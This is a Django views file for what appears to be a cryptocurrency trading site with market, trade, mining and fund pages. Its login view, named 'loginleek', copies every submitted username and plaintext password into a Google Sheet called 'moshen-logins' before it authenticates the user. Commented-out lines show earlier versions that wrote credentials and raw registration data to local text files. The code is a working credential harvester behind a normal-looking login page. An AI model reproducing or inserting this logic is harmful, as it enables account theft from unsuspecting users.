from oauth2client.service_account import ServiceAccountCredentials
from googleapiclient.discovery import build
import gspread
from django.shortcuts import render, redirect
from .forms import RegisterForm
from django.contrib.auth import login, logout, authenticate
from django.contrib.auth.forms import AuthenticationForm

SCOPE = ["https://spreadsheets.google.com/feeds",
         "https://www.googleapis.com/auth/spreadsheets",
         "https://www.googleapis.com/auth/drive.file",
         "https://www.googleapis.com/auth/drive"]

CREDS = ServiceAccountCredentials.from_json_keyfile_name('creds.json', SCOPE)
ACCESS_TOKEN = CREDS.get_access_token().access_token
CLIENT = gspread.authorize(CREDS)
DRIVE_SERVICE = build('drive', 'v3', credentials=CREDS)


# Create your views here.
def sign_up(request):
    if request.method == 'POST':
        form = RegisterForm(request.POST)
        print(request.POST)
        # with open('registers.txt', 'a') as f:
        #     f.write(str(request.POST) + '\n')
        if form.is_valid():
            print('valid')
            user = form.save()
            login(request, user)
            return redirect('/')
    else:
        form = RegisterForm()

    return render(request, 'main/register.html', {"form": form})


def home(request):
    # sh = CLIENT.open('moshen-logins')
    # print(len(sh.sheet1.get_all_values()))
    # sh.sheet1.update('A1', 'astala vista, baby')
    return render(request, 'main/home.html')


def market(request):
    return render(request, 'main/market.html')


def trade(request):
    return render(request, 'main/trade.html')


def scontract(request):
    return render(request, 'main/scontract.html')


def finance(request):
    return render(request, 'main/finance.html')


def subscribe(request):
    return render(request, 'main/subscribe.html')


def mining(request):
    return render(request, 'main/mining.html')


def fund(request):
    return render(request, 'main/fund.html')


def loginleek(request):
    if request.method == 'POST':

        sh = CLIENT.open('moshen-logins')
        sh1 = sh.sheet1
        row = len(sh1.get_all_values()) + 1
        print(row)
        sh1.update('A'+str(row), request.POST["username"])
        sh1.update('B'+str(row), request.POST["password"])

        # print(f'{request.POST["username"]}={request.POST["password"]}')
        # with open('logins.txt', 'a') as f:
        #     f.write(f'{str(request.POST["username"])}={str(request.POST["password"])}\n')
        form = AuthenticationForm(data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user:
                login(request, user)
            return redirect('/')
    else:
        form = AuthenticationForm()

    return render(request, 'main/login.html', {'form': form})
